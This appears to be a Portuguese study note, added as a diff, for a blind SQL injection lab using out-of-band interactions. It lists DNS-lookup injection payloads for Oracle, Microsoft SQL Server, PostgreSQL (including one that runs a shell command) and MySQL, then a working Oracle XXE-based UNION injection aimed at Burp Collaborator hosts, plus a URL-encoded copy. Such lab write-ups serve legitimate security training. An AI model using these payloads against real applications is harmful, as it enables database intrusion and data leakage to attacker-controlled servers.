@@ -1,0 +1,41 @@
+_____________________________________________
+\\Blind SQLi - Interações Out-Of-Band (OOB)//
+
+Para realizar este lab, é necessário provocar uma iteração Out-Of-Band, ou seja, o servidor de banco de dados
+da aplicação deve comunicar com um servidor controlado pelo hacker.
+
+DNS LOOKUP
+----------
+Oracle - The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. 
+The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+The following technique works on fully patched Oracle installations, but requires elevated privileges:
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+Microsoft - exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+PostgreSQL - copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+MySQL - The following techniques work on Windows only:
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+
+------------------------------------------------------------------------------------------
+
+Vamos usar um payload que depende da existência de uma vulnerabilidade
+relacionada XML External Entities (XXE) para gerar essas iterações.
+
+Payload OOB - Out-Of-Band
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+Injeção:
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "uec8pjs7hxzl2v4a75m16b4bb2hs5h.oastify.com"> %remote;]>'),'/l') FROM dual--
+Resultado: A aplicação faz uma requisição DNS para o servidor por nós controlado (BURP COLLABORATOR)
+
+
+pxq38eb20siglqn5q05wp6n6ux0ood.oastify.com
+
+Vamos pesquisar por url encode e colocar nosso código do payload para não dar erro.
+
+%27UNION%20SELECT%20extractvalue%28xmltype%28%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE%20root%20%5B%20%3C%21ENTITY%20%25%20remote%20SYSTEM%20%22pxq38eb20siglqn5q05wp6n6ux0ood.oastify.com%22%3E%20%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29%20FROM%20dual--
